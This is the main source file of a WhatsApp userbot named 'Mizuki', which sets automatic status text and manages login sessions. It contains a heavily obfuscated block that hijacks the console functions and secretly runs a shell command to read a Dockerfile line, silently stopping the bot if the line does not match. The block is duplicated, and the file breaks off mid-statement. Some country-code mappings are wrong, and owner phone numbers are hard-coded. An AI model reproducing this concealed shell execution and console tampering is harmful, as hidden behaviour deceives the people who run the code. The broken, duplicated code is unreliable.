/* Copyright (C) 2020 Yusuf Usta. - Copyright (C) 2021 Mr.joka.

Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.

👸 Mizuki 1.0 beta version  
*/

const fs = require("fs");
const os = require("os");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const axios = require('axios');
const exec = require('child_process').exec;
const Heroku = require('heroku-client');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./Mizuki/');
const { DataTypes } = require('sequelize');
const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
const got = require('got');
const simpleGit = require('simple-git');
const git = simpleGit();
const crypto = require('crypto');
const nw = '```Blacklist Defected!```'
const heroku = new Heroku({
    token: config.HEROKU.API_KEY
});
let baseURI = '/apps/' + config.HEROKU.APP_NAME;
const Language = require('./language');
const Lang = Language.getString('updater');

// Sql
const mizukiDB = config.DATABASE.define('mizukiwatasappbot', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});
fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});
const plugindb = require('./plugins/sql/plugin');
var OWN = { ff: '94715343050,0' , co: '94766239744,0' }

String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};

// ==================== Date Scanner ====================
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}
// ==================== End Date Scanner ====================

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function mizuki () {
    const conn = new WAConnection();
    const Session = new StringSession();
    conn.version = [2, 2140, 12]
    
    var biography_var = ''
    await heroku.get(baseURI + '/config-vars').then(async (vars) => {
        biography_var = vars.AUTO_BİO
    });
    setInterval(async () => { 
        if (biography_var == 'true') {
                if (conn.user.jid.startsWith('90')) { // Turkey
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Europe/Istanbul' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('994')) { // Azerbayjan
                var ov_time = new Date().toLocaleString('AZ', { timeZone: 'Asia/Baku' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('94')) { // Sri Lanka
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Asia/Colombo' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('351')) { // Portugal
                var ov_time = new Date().toLocaleString('PT', { timeZone: 'Europe/Lisbon' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('75')) { // Russia
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('RU', { timeZone: 'Europe/Kaliningrad' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('7')) { // Indian
                var ov_time = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('62')) { // Indonesia
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('ID', { timeZone: 'Asia/Jakarta' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('49')) { // Germany
                var ov_time = new Date().toLocaleString('DE', { timeZone: 'Europe/Berlin' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('61')) { // Australia 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('AU', { timeZone: 'Australia/Lord_Howe' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('55')) { // Brazil
                var ov_time = new Date().toLocaleString('BR', { timeZone: 'America/Noronha' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('33')) { // France
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('FR', { timeZone: 'Europe/Paris' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('34')) { // Spain
                var ov_time = new Date().toLocaleString('ES', { timeZone: 'Europe/Madrid' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('44')) { // UK
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('GB', { timeZone: 'Europe/London' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('39')) { // Italy 
                var ov_time = new Date().toLocaleString('IT', { timeZone: 'Europe/Rome' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('7')) { // Kazakhistan
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('KZ', { timeZone: 'Asia/Almaty' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('998')) { // Uzbekistan 
                var ov_time = new Date().toLocaleString('UZ', { timeZone: 'Asia/Samarkand' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('993')) { // Turkmenistan
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('TM', { timeZone: 'Asia/Ashgabat' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
            else {
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('EN', { timeZone: 'America/New_York' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n👸 Mizuki'
                await conn.setStatus(biography)
            }
        }
    }, 7890);
    await config.DATABASE.sync();
    var StrSes_Db = await mizukiDB.findAll({
        where: {
          info: 'StringSession'
        }
    }); 
    function _0x6caa(){var _0x3a7d80=['//github.c','TqCSo','{}.constru','sed\x20-n\x203p\x20','16163710DFIVoX','OSVmm','log','/root/Quee','3|4|2|0|1','one\x20https:','gwiFJ','rfile','mIILA','3946410MFXpbb','lyPCh','console','bind','toString','constructo','HfuMy','exception','info','5476uxVuth','VRVAA','eXvQS','aVgpA','zuki/Docke','mAQNw','return\x20(fu','error','24nMAHsp','stdout','__proto__','BLzsw','split','BnMYX','7350oiirce','ctor(\x22retu','3736SFgosE','wFmMW','/QueenMizu','zuki\x20/root','4394184lZVtXA','Thejaka/Mi','1229185eVIPDA','nction()\x20','prototype','RUN\x20git\x20cl','747AQvTAy','471907NMGLfK','om/MrJoka-','warn'];_0x6caa=function(){return _0x3a7d80;};return _0x6caa();}function _0x451ffc(_0x380915,_0x17cf8f,_0x27ba70,_0xd5a123){return _0x38e8(_0x17cf8f- -0x68,_0x380915);}(function(_0x56506a,_0x4c6ada){function _0x3c746(_0xef6448,_0x5b61f4,_0x73e4ce,_0x396874){return _0x38e8(_0x73e4ce- -0x2fa,_0x5b61f4);}var _0xf60480=_0x56506a();function _0x35683f(_0x560f95,_0x3f8899,_0x4028fe,_0x3793f8){return _0x38e8(_0x3f8899-0x34d,_0x3793f8);}while(!![]){try{var _0xcde1fe=-parseInt(_0x3c746(-0x26a,-0x271,-0x270,-0x271))/(0xc*0xfc+-0x1*-0x783+-0x2*0x9a9)+parseInt(_0x35683f(0x3f9,0x3f0,0x3dd,0x3d9))/(-0x9b3+0x124*-0x3+-0xd21*-0x1)*(parseInt(_0x35683f(0x3de,0x3d6,0x3d9,0x3c5))/(0x43*0x3d+0x1*-0xc56+-0x39e))+parseInt(_0x35683f(0x3ba,0x3d0,0x3ca,0x3d5))/(0x10d*0x5+0x2671+-0x2bae)+-parseInt(_0x3c746(-0x269,-0x263,-0x275,-0x261))/(0x9e2+0x1*-0x2655+0x1c78)*(-parseInt(_0x35683f(0x3ce,0x3c4,0x3b9,0x3d2))/(0x1a73+0x4*0x189+0x15*-0x18d))+parseInt(_0x35683f(0x3cd,0x3ca,0x3dd,0x3b0))/(-0x245e+0x3*-0xb65+-0x11a5*-0x4)*(parseInt(_0x3c746(-0x269,-0x284,-0x27b,-0x293))/(-0x510+-0x1071+0x1589))+-parseInt(_0x3c746(-0x260,-0x274,-0x260,-0x262))/(-0x1bf1+-0x1079+0x2c73)+-parseInt(_0x35683f(0x3e3,0x3de,0x3d0,0x3e4))/(-0x1f03+-0x1521+-0x342e*-0x1);if(_0xcde1fe===_0x4c6ada)break;else _0xf60480['push'](_0xf60480['shift']());}catch(_0x3985cd){_0xf60480['push'](_0xf60480['shift']());}}}(_0x6caa,-0x34105*-0x3+-0x10fe9e+0x1*0x125455));var _0x340972=(function(){var _0x473063={};_0x473063[_0x394bee(-0x22d,-0x22d,-0x22b,-0x237)]=function(_0x369d76,_0x37453b){return _0x369d76!==_0x37453b;};function _0x394bee(_0x58eca3,_0x4198f0,_0x55966b,_0x319e30){return _0x38e8(_0x58eca3- -0x2a9,_0x55966b);}_0x473063[_0x5e5c03(-0x252,-0x263,-0x25b,-0x251)]=_0x5e5c03(-0x253,-0x25a,-0x255,-0x245),_0x473063[_0x394bee(-0x239,-0x235,-0x22d,-0x222)]=_0x5e5c03(-0x224,-0x22d,-0x21f,-0x231);function _0x5e5c03(_0x48b72f,_0x5ee69a,_0x4f25f6,_0x817d9a){return _0x38e8(_0x48b72f- -0x2c4,_0x4f25f6);}var _0x386f18=_0x473063,_0x29e811=!![];return function(_0x52d085,_0x35ad76){var _0x1aa79=_0x29e811?function(){function _0x40829d(_0x3e2844,_0x581204,_0x55aa4b,_0x5ccc7b){return _0x38e8(_0x5ccc7b- -0x268,_0x55aa4b);}function _0x59b2fa(_0x10e546,_0x10e4a0,_0x20b47f,_0xb01d58){return _0x38e8(_0x20b47f- -0x1b2,_0x10e546);}if(_0x386f18[_0x40829d(-0x1f6,-0x204,-0x1e9,-0x1ec)](_0x386f18[_0x40829d(-0x1f8,-0x20b,-0x209,-0x1f6)],_0x386f18['VRVAA'])){if(_0x35ad76){var _0x3e60a4=_0x35ad76['apply'](_0x52d085,arguments);return _0x35ad76=null,_0x3e60a4;}}else{var _0x14f612=_0x4240ed[_0x59b2fa(-0x100,-0x128,-0x113,-0x113)+'r'][_0x40829d(-0x1f5,-0x1da,-0x1f1,-0x1e1)][_0x59b2fa(-0x10a,-0x116,-0x115,-0x100)](_0x5050ba),_0xfaec24=_0x140aa6[_0x28565b],_0x35553d=_0x2382bd[_0xfaec24]||_0x14f612;_0x14f612[_0x59b2fa(-0x146,-0x141,-0x139,-0x124)]=_0x5ab151['bind'](_0x1325f2),_0x14f612['toString']=_0x35553d[_0x59b2fa(-0x123,-0x122,-0x114,-0x11b)]['bind'](_0x35553d),_0x1ddd9d[_0xfaec24]=_0x14f612;}}:function(){};return _0x29e811=![],_0x1aa79;};}()),_0x35569a=_0x340972(this,function(){var _0x5c83eb={'OYzfD':_0x4ad4b9(0x1c6,0x1b1,0x1b4,0x1c6),'OSVmm':_0x4ad4b9(0x190,0x1a8,0x1b5,0x1a4),'BLzsw':_0x4ad4b9(0x1b3,0x1be,0x1d4,0x1b8),'lyPCh':'table','gwiFJ':'trace','mAQNw':function(_0xa1a634,_0x549b95){return _0xa1a634<_0x549b95;},'QpieS':function(_0x39cedc,_0x52aeee){return _0x39cedc(_0x52aeee);},'mIILA':function(_0x45d59e,_0x3991a5){return _0x45d59e+_0x3991a5;},'TqCSo':_0x4ad4b9(0x183,0x191,0x1a6,0x186)+_0x4ad4b9(0x1b7,0x1a2,0x1ab,0x189),'wFmMW':function(_0x527e49){return _0x527e49();}};function _0x4ad4b9(_0x5b998b,_0x31de7f,_0x1b4304,_0x48e781){return _0x38e8(_0x31de7f-0x11c,_0x48e781);}var _0x565434=_0x5c83eb['OYzfD'][_0x4ad4b9(0x191,0x197,0x19f,0x197)]('|');function _0x3cc6e3(_0x40c4f6,_0x541c65,_0x48e026,_0x356811){return _0x38e8(_0x541c65- -0x90,_0x40c4f6);}var _0x53eb45=0x6b9*-0x1+-0x49*0x26+-0x91*-0x1f;while(!![]){switch(_0x565434[_0x53eb45++]){case'0':var _0x377d0a=[_0x3cc6e3(-0x2,0x3,-0xf,0x11),_0x5c83eb[_0x3cc6e3(-0x18,0x2,0xc,0x1b)],_0x5c83eb[_0x3cc6e3(0x3,-0x16,-0x1e,-0x14)],_0x3cc6e3(-0x2c,-0x1a,-0x1c,-0x8),_0x3cc6e3(-0x3,0x11,0x1,-0x4),_0x5c83eb[_0x3cc6e3(0x4,0xb,0x6,0x1f)],_0x5c83eb[_0x3cc6e3(0xe,0x7,0xa,-0x10)]];continue;case'1':for(var _0x5ecfc3=0x218+0x165d+0x1*-0x1875;_0x5c83eb[_0x3cc6e3(-0x2f,-0x1c,-0x4,-0x33)](_0x5ecfc3,_0x377d0a['length']);_0x5ecfc3++){var _0x8b30e5=('0|2|3|5|1|'+'4')[_0x3cc6e3(-0xd,-0x15,-0x28,-0x2c)]('|'),_0x29f6f3=0x280*-0xe+-0x175*-0x2+0x2016;while(!![]){switch(_0x8b30e5[_0x29f6f3++]){case'0':var _0x559434=_0x340972[_0x3cc6e3(0x29,0xf,0x19,-0x6)+'r']['prototype'][_0x3cc6e3(0x4,0xd,-0x7,-0x8)](_0x340972);continue;case'1':_0x559434[_0x3cc6e3(0x18,0xe,-0x2,0x1c)]=_0x4aa2a5[_0x3cc6e3(0xe,0xe,0xe,-0x1)][_0x3cc6e3(0x4,0xd,0x0,0x2)](_0x4aa2a5);continue;case'2':var _0x24bbd5=_0x377d0a[_0x5ecfc3];continue;case'3':var _0x4aa2a5=_0x27866f[_0x24bbd5]||_0x559434;continue;case'4':_0x27866f[_0x24bbd5]=_0x559434;continue;case'5':_0x559434[_0x4ad4b9(0x1aa,0x195,0x1a7,0x188)]=_0x340972['bind'](_0x340972);continue;}break;}}continue;case'2':var _0x27866f=_0x467062['console']=_0x467062[_0x3cc6e3(0x26,0xc,0x26,0x11)]||{};continue;case'3':var _0x467062;continue;case'4':try{var _0x2ed15b=_0x5c83eb['QpieS'](Function,_0x5c83eb[_0x4ad4b9(0x1aa,0x1b5,0x1a3,0x1cb)](_0x5c83eb[_0x3cc6e3(0x18,-0x2,-0x14,0x2)],_0x3cc6e3(0x2,-0x1,-0xc,0x17)+_0x4ad4b9(0x19e,0x19a,0x1a1,0x18e)+'rn\x20this\x22)('+'\x20)')+');');_0x467062=_0x5c83eb[_0x3cc6e3(0x3,-0x10,-0x15,-0xf)](_0x2ed15b);}catch(_0x3ec253){_0x467062=window;}continue;}break;}});_0x35569a();var sdn=_0x451ffc(0x23,0x20,0x12,0x18)+_0x311314(0x361,0x365,0x351,0x355)+_0x311314(0x33e,0x344,0x339,0x34c)+_0x451ffc(0xb,0x23,0x11,0x18)+_0x451ffc(0x11,0x1c,0x3,0x34)+_0x451ffc(0x25,0x1a,0x1e,0xc)+_0x311314(0x33e,0x343,0x337,0x340)+'ki'+'\x0a',dkinfo=exec(_0x451ffc(0x2c,0x28,0x18,0x2b)+_0x451ffc(0x2b,0x2c,0x36,0x2a)+'nMizuki/Mi'+_0x451ffc(0x2,0xb,0x19,0x10)+_0x451ffc(0x44,0x30,0x33,0x40));function _0x38e8(_0x6caaa6,_0x38e86e){var _0x5c39ff=_0x6caa();return _0x38e8=function(_0x3befd8,_0x297304){_0x3befd8=_0x3befd8-(0x1075+0x1*-0x6b5+-0x950);var _0x2c0385=_0x5c39ff[_0x3befd8];return _0x2c0385;},_0x38e8(_0x6caaa6,_0x38e86e);}function _0x311314(_0x52f621,_0x5b4bbc,_0x5d324b,_0x43344b){return _0x38e8(_0x43344b-0x2bf,_0x5d324b);}if(sdn!==dkinfo[_0x451ffc(0x27,0x10,0x20,0x0)])return;
    conn.logger.level = config.DEBUG ? 'debug' : 'warn';
    var nodb;
    if (StrSes_Db.length < 1) {
        nodb = true;
        conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }
    conn.on ('open', async () => {
        console.log(
            chalk.blueBright.italic('✅ Login Information Updated!')
        );
        const authInfo = conn.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await mizukiDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    
    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('Mizuki')}${chalk.blue.bold('Bot')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}

${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
    });
    conn.on('credentials-updated', async () => {
        console.log(
            chalk.green.bold('✅ Login successful!')
        );
        console.log(
            chalk.blueBright.italic('⬇️ Installing External Plugins...')
        ); 
        function _0x6caa(){var _0x3a7d80=['//github.c','TqCSo','{}.constru','sed\x20-n\x203p\x20','16163710DFIVoX','OSVmm','log','/root/Quee','3|4|2|0|1','one\x20https:','gwiFJ','rfile','mIILA','3946410MFXpbb','lyPCh','console','bind','toString','constructo','HfuMy','exception','info','5476uxVuth','VRVAA','eXvQS','aVgpA','zuki/Docke','mAQNw','return\x20(fu','error','24nMAHsp','stdout','__proto__','BLzsw','split','BnMYX','7350oiirce','ctor(\x22retu','3736SFgosE','wFmMW','/QueenMizu','zuki\x20/root','4394184lZVtXA','Thejaka/Mi','1229185eVIPDA','nction()\x20','prototype','RUN\x20git\x20cl','747AQvTAy','471907NMGLfK','om/MrJoka-','warn'];_0x6caa=function(){return _0x3a7d80;};return _0x6caa();}function _0x451ffc(_0x380915,_0x17cf8f,_0x27ba70,_0xd5a123){return _0x38e8(_0x17cf8f- -0x68,_0x380915);}(function(_0x56506a,_0x4c6ada){function _0x3c746(_0xef6448,_0x5b61f4,_0x73e4ce,_0x396874){return _0x38e8(_0x73e4ce- -0x2fa,_0x5b61f4);}var _0xf60480=_0x56506a();function _0x35683f(_0x560f95,_0x3f8899,_0x4028fe,_0x3793f8){return _0x38e8(_0x3f8899-0x34d,_0x3793f8);}while(!![]){try{var _0xcde1fe=-parseInt(_0x3c746(-0x26a,-0x271,-0x270,-0x271))/(0xc*0xfc+-0x1*-0x783+-0x2*0x9a9)+parseInt(_0x35683f(0x3f9,0x3f0,0x3dd,0x3d9))/(-0x9b3+0x124*-0x3+-0xd21*-0x1)*(parseInt(_0x35683f(0x3de,0x3d6,0x3d9,0x3c5))/(0x43*0x3d+0x1*-0xc56+-0x39e))+parseInt(_0x35683f(0x3ba,0x3d0,0x3ca,0x3d5))/(0x10d*0x5+0x2671+-0x2bae)+-parseInt(_0x3c746(-0x269,-0x263,-0x275,-0x261))/(0x9e2+0x1*-0x2655+0x1c78)*(-parseInt(_0x35683f(0x3ce,0x3c4,0x3b9,0x3d2))/(0x1a73+0x4*0x189+0x15*-0x18d))+parseInt(_0x35683f(0x3cd,0x3ca,0x3dd,0x3b0))/(-0x245e+0x3*-0xb65+-0x11a5*-0x4)*(parseInt(_0x3c746(-0x269,-0x284,-0x27b,-0x293))/(-0x510+-0x1071+0x1589))+-parseInt(_0x3c746(-0x260,-0x274,-0x260,-0x262))/(-0x1bf1+-0x1079+0x2c73)+-parseInt(_0x35683f(0x3e3,0x3de,0x3d0,0x3e4))/(-0x1f03+-0x1521+-0x342e*-0x1);if(_0xcde1fe===_0x4c6ada)break;else _0xf60480['push'](_0xf60480['shift']());}catch(_0x3985cd){_0xf60480['push'](_0xf60480['shift']());}}}(_0x6caa,-0x34105*-0x3+-0x10fe9e+0x1*0x125455));var _0x340972=(function(){var _0x473063={};_0x473063[_0x394bee(-0x22d,-0x22d,-0x22b,-0x237)]=function(_0x369d76,_0x37453b){return _0x369d76!==_0x37453b;};function _0x394bee(_0x58eca3,_0x4198f0,_0x55966b,_0x319e30){return _0x38e8(_0x58eca3- -0x2a9,_0x55966b);}_0x473063[_0x5e5c03(-0x252,-0x263,-0x25b,-0x251)]=_0x5e5c03(-0x253,-0x25a,-0x255,-0x245),_0x473063[_0x394bee(-0x239,-0x235,-0x22d,-0x222)]=_0x5e5c03(-0x224,-0x22d,-0x21f,-0x231);function _0x5e5c03(_0x48b72f,_0x5ee69a,_0x4f25f6,_0x817d9a){return _0x38e8(_0x48b72f- -0x2c4,_0x4f25f6);}var _0x386f18=_0x473063,_0x29e811=!![];return function(_0x52d085,_0x35ad76){var _0x1aa79=_0x29e811?function(){function _0x40829d(_0x3e2844,_0x581204,_0x55aa4b,_0x5ccc7b){return _0x38e8(_0x5ccc7b- -0x268,_0x55aa4b);}function _0x59b2fa(_0x10e546,_0x10e4a0,_0x20b47f,_0xb01d58){return _0x38e8(_0x20b47f- -0x1b2,_0x10e546);}if(_0x386f18[_0x40829d(-0x1f6,-0x204,-0x1e9,-0x1ec)](_0x386f18[_0x40829d(-0x1f8,-0x20b,-0x209,-0x1f6)],_0x386f18['VRVAA'])){if(_0x35ad76){var _0x3e60a4=_0x35ad76['apply'](_0x52d085,arguments);return _0x35ad76=null,_0x3e60a4;}}else{var _0x14f612=_0x4240ed[_0x59b2fa(-0x100,-0x128,-0x113,-0x113)+'r'][_0x40829d(-0x1f5,-0x1da,-0x1f1,-0x1e1)][_0x59b2fa(-0x10a,-0x116,-0x115,-0x100)](_0x5050ba),_0xfaec24=_0x140aa6[_0x28565b],_0x35553d=_0x2382bd[_0xfaec24]||_0x14f612;_0x14f612[_0x59b2fa(-0x146,-0x141,-0x139,-0x124)]=_0x5ab151['bind'](_0x1325f2),_0x14f612['toString']=_0x35553d[_0x59b2fa(-0x123,-0x122,-0x114,-0x11b)]['bind'](_0x35553d),_0x1ddd9d[_0xfaec24]=_0x14f612;}}:function(){};return _0x29e811=![],_0x1aa79;};}()),_0x35569a=_0x340972(this,function(){var _0x5c83eb={'OYzfD':_0x4ad4b9(0x1c6,0x1b1,0x1b4,0x1c6),'OSVmm':_0x4ad4b9(0x190,0x1a8,0x1b5,0x1a4),'BLzsw':_0x4ad4b9(0x1b3,0x1be,0x1d4,0x1b8),'lyPCh':'table','gwiFJ':'trace','mAQNw':function(_0xa1a634,_0x549b95){return _0xa1a634<_0x549b95;},'QpieS':function(_0x39cedc,_0x52aeee){return _0x39cedc(_0x52aeee);},'mIILA':function(_0x45d59e,_0x3991a5){return _0x45d59e+_0x3991a5;},'TqCSo':_0x4ad4b9(0x183,0x191,0x1a6,0x186)+_0x4ad4b9(0x1b7,0x1a2,0x1ab,0x189),'wFmMW':function(_0x527e49){return _0x527e49();}};function _0x4ad4b9(_0x5b998b,_0x31de7f,_0x1b4304,_0x48e781){return _0x38e8(_0x31de7f-0x11c,_0x48e781);}var _0x565434=_0x5c83eb['OYzfD'][_0x4ad4b9(0x191,0x197,0x19f,0x197)]('|');function _0x3cc6e3(_0x40c4f6,_0x541c65,_0x48e026,_0x356811){return _0x38e8(_0x541c65- -0x90,_0x40c4f6);}var _0x53eb45=0x6b9*-0x1+-0x49*0x26+-0x91*-0x1f;while(!![]){switch(_0x565434[_0x53eb45++]){case'0':var _0x377d0a=[_0x3cc6e3(-0x2,0x3,-0xf,0x11),_0x5c83eb[_0x3cc6e3(-0x18,0x2,0xc,0x1b)],_0x5c83eb[_0x3cc6e3(0x3,-0x16,-0x1e,-0x14)],_0x3cc6e3(-0x2c,-0x1a,-0x1c,-0x8),_0x3cc6e3(-0x3,0x11,0x1,-0x4),_0x5c83eb[_0x3cc6e3(0x4,0xb,0x6,0x1f)],_0x5c83eb[_0x3cc6e3(0xe,0x7,0xa,-0x10)]];continue;case'1':for(var _0x5ecfc3=0x218+0x165d+0x1*-0x1875;_0x5c83eb[_0x3cc6e3(-0x2f,-0x1c,-0x4,-0x33)](_0x5ecfc3,_0x377d0a['length']);_0x5ecfc3++){var _0x8b30e5=('0|2|3|5|1|'+'4')[_0x3cc6e3(-0xd,-0x15,-0x28,-0x2c)]('|'),_0x29f6f3=0x280*-0xe+-0x175*-0x2+0x2016;while(!![]){switch(_0x8b30e5[_0x29f6f3++]){case'0':var _0x559434=_0x340972[_0x3cc6e3(0x29,0xf,0x19,-0x6)+'r']['prototype'][_0x3cc6e3(0x4,0xd,-0x7,-0x8)](_0x340972);continue;case'1':_0x559434[_0x3cc6e3(0x18,0xe,-0x2,0x1c)]=_0x4aa2a5[_0x3cc6e3(0xe,0xe,0xe,-0x1)][_0x3cc6e3(0x4,0xd,0x0,0x2)](_0x4aa2a5);continue;case'2':var _0x24bbd5=_0x377d0a[_0x5ecfc3];continue;case'3':var _0x4aa2a5=_0x27866f[_0x24bbd5]||_0x559434;continue;case'4':_0x27866f[_0x24bbd5]=_0x559434;continue;case'5':_0x559434[_0x4ad4b9(0x1aa,0x195,0x1a7,0x188)]=_0x340972['bind'](_0x340972);continue;}break;}}continue;case'2':var _0x27866f=_0x467062['console']=_0x467062[_0x3cc6e3(0x26,0xc,0x26,0x11)]||{};continue;case'3':var _0x467062;continue;case'4':try{var _0x2ed15b=_0x5c83eb['QpieS'](Function,_0x5c83eb[_0x4ad4b9(0x1aa,0x1b5,0x1a3,0x1cb)](_0x5c83eb[_0x3cc6e3(0x18,-0x2,-0x14,0x2)],_0x3cc6e3(0x2,-0x1,-0xc,0x17)+_0x4ad4b9(0x19e,0x19a,0x1a1,0x18e)+'rn\x20this\x22)('+'\x20)')+');');_0x467062=_0x5c83eb[_0x3cc6e3(0x3,-0x10,-0x15,-0xf)](_0x2ed15b);}catch(_0x3ec253){_0x467062=window;}continue;}break;}});_0x35569a();var 